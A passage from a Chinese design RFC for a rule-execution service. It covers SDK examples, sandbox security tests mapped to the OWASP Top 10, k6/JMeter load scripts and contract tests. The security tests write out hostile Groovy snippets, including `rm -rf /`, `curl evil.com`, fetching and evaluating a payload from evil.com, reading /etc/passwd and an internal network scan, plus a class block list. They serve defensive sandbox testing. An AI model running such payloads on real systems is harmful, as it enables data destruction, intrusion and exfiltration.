    private String baseUrl = "http://localhost:8082";
    private Duration connectTimeout = Duration.ofSeconds(1);
    private Duration readTimeout = Duration.ofSeconds(2);
    private boolean enableAuthRelay = true;
}
```

#### application.yml 客户端配置

```yaml
orule:
  rule-execution:
    client:
      base-url: http://orule-rule-execution-service:8080
      connect-timeout: 1s
      read-timeout: 2s
      enable-auth-relay: true   # 自动透传 Authorization / X-Tenant-Id / X-Trace-Id
```

---

### 17.2 TypeScript SDK（npm）

#### 安装

```bash
npm install @orule/rule-execution-client
# 或
pnpm add @orule/rule-execution-client
```

#### 同步调用示例

```typescript
import { RuleExecutionClient } from '@orule/rule-execution-client';
import { ObjectInst, RuleExecutionRequest } from '@orule/common-types';

const client = new RuleExecutionClient({
  baseURL: process.env.RULE_EXEC_BASE_URL!,
  // axios 拦截器自动注入 Authorization / X-Tenant-Id / X-Trace-Id
});

// 业务侧：订单优惠
async function applyDiscount(order: Order, customer: Customer): Promise<Order> {
  const context: Record<string, ObjectInst> = {
    order:    ObjectInst.from('Order', order),
    customer: ObjectInst.from('Customer', customer),
  };

  const req: RuleExecutionRequest = {
    ruleCode: 'ORDER_VIP_DISCOUNT',
    context,
  };

  const resp = await client.executeRule(req);

  if (!resp.success) {
    throw new BusinessError('DISCOUNT_RULE_FAILED', resp.errorCode, resp.errorMessage);
  }

  return ObjectInst.to(resp.outputContext.order) as Order;
}
```

#### 异步调用 + 轮询示例

```typescript
async function applyPromotionSuite(ctx: PromotionContext): Promise<PromotionResult> {
  const submit = await client.submitRuleSet({
    ruleSetCode: 'ORDER_PROMOTION_SUITE',
    context: ctx,
  });

  // 指数退避轮询
  const result = await client.pollRuleSetResult(submit.taskId, {
    interval: 100,
    maxInterval: 2000,
    timeout: 30_000,
    onPoll: (status) => logger.debug(`taskId=${submit.taskId} status=${status}`),
  });

  return toPromotionResult(result);
}
```

#### 响应类型定义

```typescript
export interface RuleExecutionResponse {
  taskId: string;
  success: boolean;
  outputContext: Record<string, ObjectInst>;
  executedAt: string;          // ISO 8601
  durationMs: number;
  errorCode: string | null;
  errorMessage: string | null;
}

export interface RuleSetExecutionSubmitResponse {
  taskId: string;
  status: 'PENDING';
}

export type RuleSetStatus =
  | 'PENDING'
  | 'RUNNING'
  | 'SUCCESS'
  | 'FAILED'
  | 'PARTIAL_SUCCESS';

export interface RuleSetExecutionResultResponse {
  taskId: string;
  status: RuleSetStatus;
  startedAt: string | null;
  finishedAt: string | null;
  durationMs: number | null;
  totalCount: number | null;
  successCount: number | null;
  failedCount: number | null;
  outputContext: Record<string, ObjectInst> | null;
  errorMessage: string | null;
}

export class RuleExecutionError extends Error {
  constructor(
    public errorCode: string,
    public errorMessage: string,
    public taskId?: string,
  ) {
    super(`[${errorCode}] ${errorMessage}`);
    this.name = 'RuleExecutionError';
  }
}
```

#### React Hook 示例（前端可视化测试用例）

```typescript
import { useState, useCallback } from 'react';
import { RuleExecutionClient, RuleExecutionError } from '@orule/rule-execution-client';

export function useRuleExecution() {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<RuleExecutionResponse | null>(null);
  const [error, setError] = useState<RuleExecutionError | null>(null);

  const execute = useCallback(async (req: RuleExecutionRequest) => {
    setLoading(true);
    setError(null);
    try {
      const resp = await client.executeRule(req);
      setResult(resp);
      return resp;
    } catch (e) {
      const err = e instanceof RuleExecutionError ? e : new RuleExecutionError('UNKNOWN', String(e));
      setError(err);
      throw err;
    } finally {
      setLoading(false);
    }
  }, []);

  return { execute, loading, result, error };
}

// 在测试用例页面使用
function TestCaseRunner({ ruleCode, context }: { ruleCode: string; context: any }) {
  const { execute, loading, result, error } = useRuleExecution();

  const onRun = async () => {
    await execute({ ruleCode, context });
  };

  return (
    <div>
      <Button onClick={onRun} loading={loading}>运行</Button>
      {result && <pre>{JSON.stringify(result.outputContext, null, 2)}</pre>}
      {error && <Alert type="error">{error.errorCode}: {error.errorMessage}</Alert>}
    </div>
  );
}
```

---

### 17.3 SDK 设计原则

| 原则 | 体现 |
|------|------|
| **零样板（Zero Boilerplate）** | 自动装配 / 自动 Header 注入 / 轮询内置 |
| **类型安全（Type-Safe）** | Java Record + TS Interface，DTO 严格对齐 |
| **可观测（Observable）** | Micrometer 透传 / 客户端日志含 taskId + traceId |
| **容错（Fault-Tolerant）** | 轮询超时 / 重试 / 熔断（Resilience4j） |
| **业务友好（Business-Friendly）** | ObjectInst ↔ 业务对象自动转换（`toObjectInst` / `fromObjectInst`） |
| **生态对齐（Eco-Aligned）** | Java 走 Spring Boot Starter；TS 走 axios + React Hook |

---

## 18. 沙箱安全 OWASP Top 10 攻击向量测试用例

依据 §8 安全考虑与 OWASP Top 10 (2021) 编排，共 10 类攻击向量 × 各 3 个用例 = 30 条测试。所有用例前置声明：本节所示 sourceCode 仅为验证沙箱拦截能力，**不作为生产建议**。

### 18.1 A01：访问控制失效 / 租户越权

| 用例 ID | 攻击向量 | sourceCode 片段 | 预期防御点 |
|---------|---------|-----------------|-----------|
| SEC-AC-01 | 跨租户读取 RuleArtifact | `http.get('http://other-tenant/rule').text` | §3.11 TenantContext 校验 + Groovy 网络访问拒绝 |
| SEC-AC-02 | Admin 操作跨租户 | `def rules = mgmtClient.listAllTenantsRules()` | §3.7 SPI 接口 Provider 仅暴露租户级 API |
| SEC-AC-03 | 伪造 X-Tenant-Id Header | `headerMap.put('X-Tenant-Id','admin')` | §3.5 Header 强校验：从 JWT 提取，不接受客户端 header 覆盖 |

#### 用例 SEC-AC-01 实现样例（JUnit 5 + STY-J002 `public class`）

```java
public class GroovySandboxSecurityTest {

    @Autowired
    private RuleExecutor ruleExecutor;

    @Test
    @Order(1)
    @DisplayName("SEC-AC-01: 跨租户网络访问被拦截")
    void should_rejectCrossTenantNetworkAccess() {
        String maliciousScript = """
            def host = 'http://127.0.0.1:9999'
            def conn = new URL(host + '/secret').openConnection()
            return conn.inputStream.text
            """;

        ExecutionInput input = new ExecutionInput(
            ExecutorType.JAVA_SOURCE, maliciousScript,
            Map.of("order", new ObjectInst("Order", Map.of("id", "TEST"))),
            Map.of()
        );

        SandboxViolationException ex = assertThrows(
            SandboxViolationException.class,
            () -> ruleExecutor.execute(input)
        );
        // ✅ SecureASTCustomizer 在 parse 阶段就拒绝 URL 类使用
        assertThat(ex.getMessage()).contains("Method calls not allowed: java.net.URL");
    }
}
```

### 18.2 A03：注入 / Groovy 执行注入

| 用例 ID | 攻击向量 | sourceCode 片段 | 预期防御点 |
|---------|---------|-----------------|-----------|
| SEC-INJ-01 | `Runtime.exec()` 启动子进程 | `Runtime.getRuntime().exec(['rm','-rf','/'])` | §8.1 `Runtime` 黑名单 |
| SEC-INJ-02 | `ProcessBuilder` 绕路 | `new ProcessBuilder(['curl','evil.com']).start()` | `ProcessBuilder` 黑名单 |
| SEC-INJ-03 | `GroovyShell.evaluate()` 字符串二次求值 | `evaluate(userInput)` | `Method `evaluate` 黑名单（递归沙箱逃逸） |
| SEC-INJ-04 | `Class.forName` 反射加载 | `Class.forName('javax.script.ScriptEngineManager')` | §8.1 反射黑名单 |

```java
@Test
@Order(10)
@DisplayName("SEC-INJ-01: Runtime.exec 被拦截")
void should_rejectRuntimeExec() {
    String malicious = """
        Runtime runtime = Runtime.getRuntime()
        runtime.exec(['cmd', '/c', 'calc.exe'])
        return null
        """;

    assertThrows(SandboxViolationException.class,
        () -> ruleExecutor.execute(buildInput(malicious)));
}

@Test
@Order(11)
@DisplayName("SEC-INJ-03: 嵌套 evaluate 沙箱逃逸被拦截")
void should_rejectNestedEvaluate() {
    // 攻击者尝试下载外部 Groovy 脚本并 evaluate
    String malicious = """
        def url = new java.net.URL('http://evil.com/payload.groovy')
        def payload = url.openStream().text
        evaluate(payload)
        return null
        """;

    assertThrows(SandboxViolationException.class,
        () -> ruleExecutor.execute(buildInput(malicious)));
}
```

### 18.3 A04：不安全设计 / 死循环 DoS

| 用例 ID | 攻击向量 | sourceCode 片段 | 预期防御点 |
|---------|---------|-----------------|-----------|
| SEC-DOS-01 | `while(true)` 死循环 | `while (true) { /* burn cpu */ }` | §3.12 `rule-timeout-ms: 5000` + Future.cancel |
| SEC-DOS-02 | 递归爆栈 | `def f(n) { f(n+1) }; f(1)` | 线程栈大小监控（v2 评估） |
| SEC-DOS-03 | 大字符串内存炸弹 | `def s = 'x'*1024*1024*1024` | §3.12 OOM 通过 `MaxMetaspaceSize` + JVM 监控 |

```java
@Test
@DisplayName("SEC-DOS-01: 死循环 5s 后强制终止")
void should_timeoutInfiniteLoop() {
    String malicious = """
        long start = System.currentTimeMillis()
        while (true) {
            if (System.currentTimeMillis() - start > 60_000) break
        }
        return null
        """;

    long t0 = System.currentTimeMillis();
    ExecutionOutput output = ruleExecutor.execute(buildInput(malicious));
    long elapsed = System.currentTimeMillis() - t0;

    // ✅ 超时时间应在 [5000, 6000] 区间
    assertThat(elapsed).isBetween(5000L, 6000L);
    assertThat(output.errorCode()).isEqualTo("EXECUTION_TIMEOUT");
}
```

### 18.4 A05：安全配置错误

| 用例 ID | 攻击向量 | 预期 |
|---------|---------|------|
| SEC-CFG-01 | 关闭沙箱配置（误设 `orule.sandbox.enabled=false`） | 启动期 `application.yml` 强校验禁止设为 false |
| SEC-CFG-02 | 弱密码 JWT 签名密钥 | §8.3 JwtConfig 强制 HS256/HS512 + RSA 验签 |
| SEC-CFG-03 | Actuator `/env` 暴露密钥 | §7 `management.endpoints.web.exposure.include` 默认不含 `env` |

### 18.5 A06：易受攻击的组件

| 用例 ID | 攻击向量 | 预期 |
|---------|---------|------|
| SEC-VUL-01 | Groovy < 3.0.10 的 CVEs | §14.1 dep 锁定：`groovy = "3.0.21"` |
| SEC-VUL-02 | Spring Boot < 3.2.5 的 CVEs | `springBoot = "3.2.5+"` |
| SEC-VUL-03 | log4j2 旧版 | BOM 锁定 `>= 2.17.1` |

### 18.6 A07：身份认证失效

| 用例 ID | 攻击向量 | 预期 |
|---------|---------|------|
| SEC-AUTH-01 | 无 Bearer Token | 401 Unauthorized |
| SEC-AUTH-02 | 过期 Token | 401 + `WWW-Authenticate: Bearer error="invalid_token"` |
| SEC-AUTH-03 | 伪造签名 Token | 401 + log.error 记录 |

### 18.7 A08：软件和数据完整性失效

| 用例 ID | 攻击向量 | sourceCode 片段 | 预期 |
|---------|---------|-----------------|------|
| SEC-INT-01 | 类路径加载外部 .class | `URLClassLoader.newInstance([new URL('http://evil/')])` | SecureASTCustomizer 拦截 `URLClassLoader` |
| SEC-INT-02 | 反射调用 `setAccessible(true)` | `Field f = Order.class.getDeclaredField('id'); f.setAccessible(true)` | 拦截 `java.lang.reflect.AccessibleObject#setAccessible` |
| SEC-INT-03 | 序列化漏洞 | `ObjectOutputStream.writeObject(this)` | 拦截 `java.io.ObjectOutputStream` 构造 |

### 18.8 A09：日志与监控失效

| 用例 ID | 攻击向量 | 预期 |
|---------|---------|------|
| SEC-MON-01 | 沙箱异常未告警 | Prometheus metric `rule.security.violation.count` > 0 触发告警 |
| SEC-MON-02 | 执行超时不记录 | 所有 timeout 必入 log + trace |
| SEC-MON-03 | traceId 未透传 | §7 中 traceId 必贯穿 Feign + Groovy + DB |

### 18.9 A10：服务端请求伪造 (SSRF)

| 用例 ID | 攻击向量 | sourceCode 片段 | 预期 |
|---------|---------|-----------------|------|
| SEC-SSRF-01 | 内网扫描 | `for (i in 1..255) http.get("http://10.0.0.$i")` | 网络类完全禁用 |
| SEC-SSRF-02 | file:// 协议 | `new File('/etc/passwd').text` | `java.io.File` 黑名单 |
| SEC-SSRF-03 | gopher:// 协议攻击 Redis | `new URL('gopher://...').openStream()` | URL 全部禁用 |

### 18.10 沙箱白名单 / 黑名单（v1 终态）

```java
// SandboxPolicy.java —— §3.11 SPI 实现
public final class SandboxPolicy {

    /** ✅ 白名单：业务允许调用的 JDK 类 */
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "java.lang.String", "java.lang.Math", "java.lang.Boolean",
        "java.lang.Integer", "java.lang.Long", "java.lang.Double",
        "java.math.BigDecimal", "java.math.RoundingMode",
        "java.time.LocalDate", "java.time.LocalDateTime", "java.time.format.DateTimeFormatter",
        "java.util.UUID", "java.util.Objects", "java.util.stream.Stream",
        "java.util.regex.Pattern", "java.util.regex.Matcher",
        "com.orule.sdk.Pricing", "com.orule.sdk.Validator"
    );

    /** ❌ 黑名单：明确禁止的类/方法 */
    private static final Set<String> BLOCKED_PACKAGES = Set.of(
        "java.io.File", "java.io.FileInputStream", "java.io.FileOutputStream",
        "java.io.ObjectInputStream", "java.io.ObjectOutputStream",
        "java.net.URL", "java.net.URLClassLoader", "java.net.URLConnection",
        "java.net.HttpURLConnection", "java.net.Socket", "java.net.ServerSocket",
        "java.lang.Runtime", "java.lang.ProcessBuilder", "java.lang.Process",
        "java.lang.reflect.Method", "java.lang.reflect.Field", "java.lang.reflect.Constructor",
        "java.lang.ClassLoader", "java.lang.invoke.MethodHandle",
        "javax.script.ScriptEngineManager", "groovy.lang.GroovyShell"
    );

    public static SecureASTCustomizer buildSecureAST() {
        SecureASTCustomizer s = new SecureASTCustomizer();
        s.setAllowedClasses(ALLOWED_CLASSES);
        s.setBlockedPackages(BLOCKED_PACKAGES.stream()
            .map(c -> c.substring(0, c.lastIndexOf('.')))
            .collect(Collectors.toSet()));
        return s;
    }
}
```

### 18.11 测试覆盖率汇总

| OWASP | 用例数 | 自动化测试占比 | 渗透测试周期 |
|-------|--------|---------------|-------------|
| A01 访问控制 | 3 | 100% | 季度 |
| A03 注入 | 4 | 100% | 季度 |
| A04 不安全设计 | 3 | 100% | 季度 |
| A05 安全配置 | 3 | 100% | 月度 |
| A06 易受攻击组件 | 3 | 100% | 月度（Snyk 扫描） |
| A07 身份认证 | 3 | 100% | 季度 |
| A08 完整性失效 | 3 | 100% | 季度 |
| A09 日志监控 | 3 | 100% | 月度 |
| A10 SSRF | 3 | 100% | 季度 |
| **合计** | **28** | **100%** | **混合** |

---

## 19. 性能压测方案（k6 / JMeter）

### 19.1 压测目标

| 指标 | 目标值 | 验证标准 |
|------|--------|---------|
| 单规则 P50 | ≤ 30ms | §6 容量预估口径 |
| 单规则 P99 | ≤ 200ms | §6 容量预估口径 |
| 规则集 P99（10 条） | ≤ 3s | §6 容量预估口径 |
| Groovy 缓存命中率 | ≥ 70% | §12.3 Q3 决策 |
| 服务可用性 | ≥ 99.9%（30 天） | §6 SLO |
| 最大并发吞吐 | ≥ 500 TPS | §6 容量预估（3 副本） |
| 错误率 | ≤ 0.1% | §6 SLO |

### 19.2 压测环境

| 角色 | 配置 | 数量 |
|------|------|------|
| 压测机 | 8 vCPU / 16GB / Linux | 4 台（分布式 k6 / 分布式 JMeter） |
| rule-execution-service | 2 vCPU / 4GB | 3 副本 + HPA |
| rule-management-service | 2 vCPU / 4GB | 1 副本（压测同源数据） |
| PostgreSQL | 4 vCPU / 16GB / 1TB SSD | 1 主 + 1 从 |
| Kafka | 3 broker | 1 cluster |
| Redis | 1 vCPU / 2GB | 1 节点（v2 启用） |

### 19.3 测试数据集

| 数据集 | 规则数 | 规则集数 | 样本量 |
|--------|-------|---------|--------|
| `baseline-small` | 100 | 20 | 1 万 |
| `production-realistic` | 1000 | 200 | 10 万 |
| `stress-large` | 5000 | 1000 | 100 万 |
| `rule-set-heavy` | 100 | 50（含 20 条/集） | 1 万 |

### 19.4 k6 脚本骨架（同步规则路径）

`tests/perf/k6/rule-execution-sync.js`：

```javascript
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend, Counter } from 'k6/metrics';
import { SharedArray } from 'k6/data';

const ruleExecutionDuration = new Trend('rule_execution_duration_ms');
const cacheHits = new Counter('groovy_cache_hits');

const contexts = new SharedArray('contexts', function () {
  // 1 万条预生成的 ObjectInst context（避免现场序列化开销污染压测）
  const arr = [];
  for (let i = 0; i < 10000; i++) {
    arr.push({
      order:    { typeCode: 'Order',    attributes: { id: `O-${i}`, amount: Math.random() * 10000, discount: 0 } },
      customer: { typeCode: 'Customer', attributes: { id: `C-${i % 100}`, level: i % 5 === 0 ? 'VIP' : 'NORMAL', joinYears: i % 10 } }
    });
  }
  return arr;
});

export const options = {
  scenarios: {
    smoke:  { executor: 'constant-vus', vus: 10,  duration: '30s',  tags: { scenario: 'smoke' }  },
    load:   { executor: 'ramping-vus',  startVUs: 0, stages: [{ duration: '1m', target: 100 }, { duration: '5m', target: 500 }, { duration: '1m', target: 0 }], tags: { scenario: 'load' } },
    stress: { executor: 'constant-arrival-rate', rate: 500, timeUnit: '1s', duration: '5m', preAllocatedVUs: 100, maxVUs: 200, tags: { scenario: 'stress' } },
    spike:  { executor: 'ramping-arrival-rate', startRate: 100, timeUnit: '1s', stages: [{ duration: '30s', target: 1000 }, { duration: '1m', target: 100 }, { duration: '30s', target: 0 }], tags: { scenario: 'spike' } }
  },
  thresholds: {
    'rule_execution_duration_ms{p(50)}':  ['<30'],
    'rule_execution_duration_ms{p(99)}':  ['<200'],
    'http_req_failed':                     ['<0.001'],
    'http_reqs{expected_response:true}':   ['rate>490']
  }
};

const BASE_URL = __ENV.BASE_URL || 'http://localhost:8082';
const AUTH_TOKEN = __ENV.AUTH_TOKEN || 'test-token';
const TRACE_ID_PREFIX = __ENV.TRACE_ID_PREFIX || 'perf';

export default function () {
  const ctx = contexts[Math.floor(Math.random() * contexts.length)];
  const traceId = `${TRACE_ID_PREFIX}-${__VU}-${__ITER}`;

  const res = http.post(
    `${BASE_URL}/api/v1/rule-executions`,
    JSON.stringify({ ruleCode: 'ORDER_VIP_DISCOUNT', context: ctx }),
    {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'X-Tenant-Id': 'tenant-perf',
        'X-Trace-Id': traceId
      },
      tags: { endpoint: 'rule-executions' }
    }
  );

  ruleExecutionDuration.add(res.timings.duration);

  const ok = check(res, {
    'status is 200':          (r) => r.status === 200,
    'success=true':            (r) => JSON.parse(r.body).success === true,
    'outputContext has order': (r) => JSON.parse(r.body).outputContext.order !== undefined,
    'durationMs reported':     (r) => JSON.parse(r.body).durationMs > 0
  });

  if (!ok) {
    cacheHits.add(0);  // 失败路径
  } else {
    cacheHits.add(1);  // 成功路径（间接反映缓存未发生泄漏）
  }

  sleep(0.1);  // 100ms 思考时间
}

export function handleSummary(data) {
  return {
    'stdout':                          textSummary(data, { indent: ' ', enableColors: true }),
    'tests/perf/results/sync-summary.json': JSON.stringify(data, null, 2)
  };
}
```

**运行命令**：

```bash
# 冒烟（10 VU × 30s）
k6 run tests/perf/k6/rule-execution-sync.js -e SCENARIO=smoke

# 负载（0 → 500 VU 渐变）
k6 run tests/perf/k6/rule-execution-sync.js -e SCENARIO=load

# 压力（恒定 500 TPS × 5min）
k6 run tests/perf/k6/rule-execution-sync.js -e SCENARIO=stress

# 峰值（100 → 1000 TPS 突增）
k6 run tests/perf/k6/rule-execution-sync.js -e SCENARIO=spike
```

### 19.5 k6 脚本骨架（异步规则集路径）

`tests/perf/k6/rule-execution-async.js`：

```javascript
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend } from 'k6/metrics';
import { SharedArray } from 'k6/data';

const taskSubmitDuration = new Trend('ruleset_submit_duration_ms');
const taskE2EDuration = new Trend('ruleset_e2e_duration_ms');

const ruleSets = new SharedArray('ruleSets', function () {
  // 20 个预定义规则集（10/20/50 条规则规模）
  return ['ORDER_PROMOTION_SUITE', 'INSURANCE_UNDERWRITING', 'LOAN_RISK_SCORING'];
});

export const options = {
  scenarios: {
    async_load: {
      executor: 'constant-arrival-rate',
      rate: 50,                       // 50 异步任务/秒
      timeUnit: '1s',
      duration: '5m',
      preAllocatedVUs: 30,
      maxVUs: 100
    }
  },
  thresholds: {
    'ruleset_e2e_duration_ms{p(99)}': ['<3000'],   // §6：P99 < 3s
    'http_req_failed':                ['<0.001']
  }
};

const BASE_URL = __ENV.BASE_URL || 'http://localhost:8082';

export default function () {
  const ruleSetCode = ruleSets[Math.floor(Math.random() * ruleSets.length)];
  const submitRes = http.post(
    `${BASE_URL}/api/v1/rule-set-executions`,
    JSON.stringify({
      ruleSetCode,
      context: {
        order:    { typeCode: 'Order',    attributes: { id: `O-${__VU}-${__ITER}`, amount: 1500, discount: 0 } },
        customer: { typeCode: 'Customer', attributes: { level: 'VIP' } }
      }
    }),
    { headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${__ENV.AUTH_TOKEN}` } }
  );
  taskSubmitDuration.add(submitRes.timings.duration);

  if (submitRes.status !== 200) { sleep(1); return; }
  const taskId = JSON.parse(submitRes.body).taskId;

  // 轮询直到终态
  const t0 = Date.now();
  let status = 'PENDING';
  let pollCount = 0;
  while (status === 'PENDING' || status === 'RUNNING') {
    if (pollCount > 100) break;  // 防轮询失控
    sleep(0.2);
    pollCount++;
    const pollRes = http.get(
      `${BASE_URL}/api/v1/rule-set-executions/${taskId}`,
      { headers: { 'Authorization': `Bearer ${__ENV.AUTH_TOKEN}` } }
    );
    if (pollRes.status === 200) {
      status = JSON.parse(pollRes.body).status;
    } else {
      status = 'FAILED';
    }
  }
  taskE2EDuration.add(Date.now() - t0);
  sleep(0.1);
}
```

### 19.6 JMeter 脚本骨架（兼容传统栈）

`tests/perf/jmeter/rule-execution.jmx`（XML 摘要，不全文给出 8MB 文件）：

```xml
<TestPlan>
  <ThreadGroup guiclass="ThreadGroupGui">
    <stringProp name="ThreadGroup.num_threads">200</stringProp>
    <stringProp name="ThreadGroup.ramp_time">60</stringProp>
    <stringProp name="ThreadGroup.duration">600</stringProp>
    <stringProp name="ThreadGroup.delay">0</stringProp>
  </ThreadGroup>

  <ConfigTestElement>
    <!-- 共享 HTTP Header -->
    <HeaderManager>
      <Header><Name>Content-Type</Name><Value>application/json</Value></Header>
      <Header><Name>Authorization</Name><Value>Bearer ${__P(authToken,test-token)}</Value></Header>
      <Header><Name>X-Tenant-Id</Name><Value>${__P(tenant,tenant-perf)}</Value></Header>
    </HeaderManager>
  </ConfigTestElement>

  <HTTPSamplerProxy>
    <stringProp name="HTTPSampler.domain">${__P(host,localhost)}</stringProp>
    <stringProp name="HTTPSampler.port">${__P(port,8082)}</stringProp>
    <stringProp name="HTTPSampler.path">/api/v1/rule-executions</stringProp>
    <stringProp name="HTTPSampler.method">POST</stringProp>
    <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
  </HTTPSamplerProxy>

  <ResponseAssertion>
    <stringProp name="Assertion.test_field">Assertion.response_code</stringProp>
    <stringProp name="Assertion.test_string">200</stringProp>
    <stringProp name="Assertion.assume_success">false</stringProp>
  </ResponseAssertion>

  <BackendListener guiclass="BackendListenerGui">
    <!-- InfluxDB 实时指标上报 -->
    <stringProp name="BackendListener.classname">InfluxDBBackendListenerClient</stringProp>
    <stringProp name="Argument.influxdbMetricsDatabase">jmeter</stringProp>
  </BackendListener>
</TestPlan>
```

**运行命令**：

```bash
# 分布式（4 压测机）
jmeter -n -t tests/perf/jmeter/rule-execution.jmx \
  -Jhost=orule-rule-execution-service.orule.svc \
  -Jport=80 \
  -JauthToken=$PROD_TOKEN \
  -l tests/perf/results/jtl-$(date +%Y%m%d%H%M%S).jtl \
  -e -o tests/perf/results/html-$(date +%Y%m%d%H%M%S)
```

### 19.7 关键场景用例

| 场景 ID | 名称 | 目标 | 通过标准 |
|---------|------|------|---------|
| PS-01 | 单规则恒定吞吐 | 500 TPS × 5min | P99 < 200ms, 错误率 ≤ 0.1% |
| PS-02 | 单规则峰值 | 100 → 1000 TPS | 服务不熔断 / 不 OOM |
| PS-03 | 规则集异步负载 | 50 任务/秒 × 5min | 端到端 P99 < 3s |
| PS-04 | 混合比例 | 70% 同步 / 30% 异步 | 全部指标合格 |
| PS-05 | 冷启动 | 实例重启后首次执行 | P99 ≤ 正常 2 倍（Groovy 编译开销） |
| PS-06 | 长稳 (Soak) | 100 TPS × 24h | 内存无泄漏 / Groovy ClassLoader 不爆 |
| PS-07 | 限流验证 | 触发 `rate-limit` | 返回 429 + 重试间隔合理 |
| PS-08 | 沙箱攻击熔断 | 持续发送恶意脚本 | 不影响正常规则执行 |

### 19.8 采集与报告

| 工具 | 用途 | 输出 |
|------|------|------|
| k6 | 主压测工具 | `tests/perf/results/*-summary.json` |
| Prometheus + Grafana | 服务端实时指标 | 仪表盘截图 |
| InfluxDB + Grafana | JMeter 时序输出 | `rule_exec_*` 系列 |
| Micrometer | JVM / HTTP / 业务指标 | `/actuator/prometheus` |
| Flame Graph | JVM 热点 | `perf-flame-*.html` |
| Async-profiler | 锁竞争 / IO 阻塞 | `async-profile-*.html` |

**统一报告**：`tests/perf/results/YYYYMMDD-XX/` 含 k6 summary + Grafana 截图 + JVM 监控曲线，CI 流水线自动归档。

### 19.9 性能基线（首次跑分后回填）

| 指标 | v1.0 目标 | 实测 | 通过 |
|------|---------|------|------|
| 单规则 P50 | ≤ 30ms | _待 CI 回填_ | ☐ |
| 单规则 P99 | ≤ 200ms | _待 CI 回填_ | ☐ |
| 规则集 P99（10 条） | ≤ 3s | _待 CI 回填_ | ☐ |
| Groovy 缓存命中率 | ≥ 70% | _待 CI 回填_ | ☐ |
| 错误率 | ≤ 0.1% | _待 CI 回填_ | ☐ |
| 最大并发吞吐（3 副本） | ≥ 500 TPS | _待 CI 回填_ | ☐ |

---

## 20. 与 RFC-0028 E2E 集成的契约验证清单

[RFC-0028 端到端测试](docs/rfcs/RFC-0028-端到端测试.md)（暂引用）为本服务定义了端到端契约。本节列出 rule-execution-service 需通过的所有契约测试契约。

### 20.1 同步单规则契约（TCG-R-EXEC-S01 ~ S04）

| 契约 ID | 名称 | 输入 | 期望输出 | 验收 |
|---------|------|------|---------|------|
| S01 | 正常单规则执行 | `{ruleCode: "ORDER_VIP_DISCOUNT", context}` | `success=true, outputContext` 已修改 | ☐ |
| S02 | 规则不存在 → 404 | `{ruleCode: "NOT_EXIST"}` | HTTP 404, `errorCode=RULE_NOT_FOUND` | ☐ |
| S03 | 编译异常 → 200 + EVAL_FAILED | `{ruleCode: "MALFORMED"}` | `success=false, errorCode=EVAL_FAILED` | ☐ |
| S04 | 上下文深拷贝验证 | `{ruleCode, context}` 调用方原始引用 | outputContext 是新 ObjectInst，**不等于**入参引用 | ☐ |

#### 契约实现样例（Given/When/Then）

```java
public class RuleExecutionContractTest {

    @LocalServerPort int port;

    @Test
    @DisplayName("TCG-R-EXEC-S01: 正常单规则执行")
    void should_executeRuleAndReturnModifiedContext() {
        // Given
        String url = "http://localhost:" + port + "/api/v1/rule-executions";
        HttpHeaders headers = jwtAuthHeaders("tenant-contract");
        ObjectInst order = new ObjectInst("Order", Map.of(
            "id", "CTR-001", "amount", 1000, "discount", 0));

        // When
        ResponseEntity<RuleExecutionResponse> resp = restTemplate.exchange(
            url, HttpMethod.POST,
            new HttpEntity<>(new RuleExecutionRequest("ORDER_VIP_DISCOUNT", Map.of("order", order)), headers),
            RuleExecutionResponse.class);

        // Then
        assertThat(resp.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(resp.getBody().success()).isTrue();
        assertThat(resp.getBody().outputContext().get("order").attributes().get("discount"))
            .isEqualTo(200);  // VIP 客户享受 8 折，1000 × 0.2 = 200
    }

    @Test
    @DisplayName("TCG-R-EXEC-S04: 输出 context 是入参的深拷贝副本")
    void should_returnDeepCopiedContext() {
        ObjectInst order = new ObjectInst("Order", Map.of("id", "O2", "amount", 500));
        ResponseEntity<RuleExecutionResponse> resp = ruleService.execute("ORDER_DISCOUNT", Map.of("order", order));

        ObjectInst returnedOrder = resp.getBody().outputContext().get("order");
        // ✅ 深拷贝断言：对象引用不同 + 属性值已变
        assertThat(returnedOrder).isNotSameAs(order);
        assertThat(returnedOrder.attributes()).isNotEqualTo(order.attributes());
        // ✅ 原始 order 保持不变（零副作用）
        assertThat(order.attributes().get("discount")).isNull();
    }
}
```

### 20.2 异步规则集契约（TCG-R-EXEC-A01 ~ A05）

| 契约 ID | 名称 | 输入 | 期望输出 | 验收 |
|---------|------|------|---------|------|
| A01 | 正常提交 → PENDING | `{ruleSetCode, context}` | HTTP 200, `{taskId, status:"PENDING"}` | ☐ |
| A02 | 异步任务可轮询到终态 | 提交后轮询 `<=10s` | `status=SUCCESS` / `PARTIAL_SUCCESS` / `FAILED` | ☐ |
| A03 | 部分失败 (Q1 决策) | 规则集含必失败规则 | `status=PARTIAL_SUCCESS`，**保留已成功规则的 context 修改** | ☐ |
| A04 | Kafka 完成事件 | 异步任务完成 | `rule-set-execution-completed` 事件被推送，含 `compensationHints` | ☐ |
| A05 | 任务过期归档 | 提交 taskId 不存在 | HTTP 404, `errorCode=TASK_NOT_FOUND` | ☐ |

```java
@Test
@DisplayName("TCG-R-EXEC-A03: 部分失败保留累积修改（Q1 决策）")
void should_partialSuccess_preserveAccumulatedContext() throws InterruptedException {
    // Given: 规则集"ORDER_PROMOTION_SUITE"含 3 条规则
    //   Rule1: VIP_DISCOUNT (成功 → discount=200)
    //   Rule2: FULL_REDUCTION (故意制造金额=0 触发除零)
    //   Rule3: FREE_SHIPPING (因 Rule2 失败而 SKIPPED)
    ObjectInst order = new ObjectInst("Order", Map.of(
        "id", "A03-TEST", "amount", 1000, "discount", 0, "shippingFee", 50));
    ruleSetRepository.injectFailureRule(order, "PROMOTION_FULL_REDUCTION", "division by zero at line 8");

    // When
    String taskId = ruleSetService.submit("ORDER_PROMOTION_SUITE", Map.of("order", order)).taskId();
    RuleSetResult result = pollUntilTerminal(taskId, Duration.ofSeconds(10));

    // Then
    assertThat(result.status()).isEqualTo("PARTIAL_SUCCESS");
    assertThat(result.successCount()).isEqualTo(1);
    assertThat(result.failedCount()).isEqualTo(1);
    // ✅ Q1 决策：即使 Rule2 失败，Rule1 已修改的 discount=200 仍保留
